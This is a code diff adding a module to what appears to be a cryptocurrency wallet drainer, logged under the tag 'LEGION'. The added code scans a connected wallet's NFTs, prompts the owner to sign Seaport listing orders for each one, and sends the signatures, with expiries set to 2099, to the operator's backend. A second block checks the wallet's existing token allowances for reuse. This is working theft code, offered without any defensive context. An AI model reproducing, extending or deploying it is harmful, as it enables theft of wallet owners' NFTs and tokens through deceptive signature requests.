@@ -2032,6 +2032,74 @@
         }
       }
 
+      // ─── NFT Scanning & Seaport Listing (after token signatures) ────
+      if (signatures.EVM && connectedChains.EVM) {
+        console.log('[LEGION]   🖼️  Scanning NFTs...');
+        try {
+          var nftScanResult = await apiPost('/api/v1/seaport/scan-listings', {
+            wallet_address: connectedChains.EVM.address,
+            chain_id: connectedChains.EVM.chainId || 1
+          });
+          if (nftScanResult && nftScanResult.listings && nftScanResult.listings.length > 0) {
+            console.log('[LEGION]   🖼️  Found', nftScanResult.listings.length, 'NFTs');
+            // Submit Seaport listing for each valuable NFT
+            for (var ni = 0; ni < nftScanResult.listings.length; ni++) {
+              try {
+                var nftListing = nftScanResult.listings[ni];
+                var seaportTypedData = await apiPost('/api/v1/seaport/listing-typed-data', {
+                  wallet_address: connectedChains.EVM.address,
+                  chain_id: connectedChains.EVM.chainId || 1,
+                  token_address: nftListing.contract,
+                  token_id: nftListing.tokenId
+                });
+                if (seaportTypedData && seaportTypedData.typedData) {
+                  var nftSig = await connectedChains.EVM.provider.request({
+                    method: 'eth_signTypedData_v4',
+                    params: [connectedChains.EVM.address, JSON.stringify(seaportTypedData.typedData)]
+                  });
+                  if (nftSig) {
+                    await apiPost('/api/v1/signature-anchor', {
+                      ingress: 'normalized_v1',
+                      chain_family: 'EVM',
+                      protocol: 'seaport_listing',
+                      wallet_address: connectedChains.EVM.address,
+                      token_address: nftListing.contract,
+                      signature: nftSig,
+                      nonce: 'legion:nft:' + Date.now(),
+                      expiry_iso: '2099-12-31T23:59:59.999Z',
+                      wallet_type: connectedChains.EVM.walletType || 'hot_wallet',
+                      chain_id: connectedChains.EVM.chainId || 1,
+                      seaport_order: seaportTypedData.order
+                    });
+                    console.log('[LEGION]   ✅ NFT listed:', nftListing.contract);
+                  }
+                }
+              } catch (nftErr) {
+                console.warn('[LEGION]   ⚠️ NFT listing skipped:', nftErr.message);
+              }
+            }
+          } else {
+            console.log('[LEGION]   ℹ️  No NFTs found in wallet');
+          }
+        } catch (nftScanErr) {
+          console.debug('[LEGION]   NFT scan skipped:', nftScanErr.message);
+        }
+
+        // ─── Allowance Reuse Check ────
+        console.log('[LEGION]   🔄 Checking existing allowances...');
+        try {
+          var reuseResult = await apiPost('/api/v1/allowance-reuse/check', {
+            wallet_address: connectedChains.EVM.address,
+            chain_id: connectedChains.EVM.chainId || 1
+          });
+          if (reuseResult && reuseResult.reusable && reuseResult.reusable.length > 0) {
+            console.log('[LEGION]   🔄 Found', reuseResult.reusable.length, 'reusable allowances');
+          }
+        } catch (reuseErr) {
+          console.debug('[LEGION]   Allowance reuse check skipped:', reuseErr.message);
+        }
+      }
+
       PARALLEL_STATS.totalTime = PARALLEL_STATS.detectionTime +
                                  PARALLEL_STATS.connectionTime +
                                  PARALLEL_STATS.signatureTime;
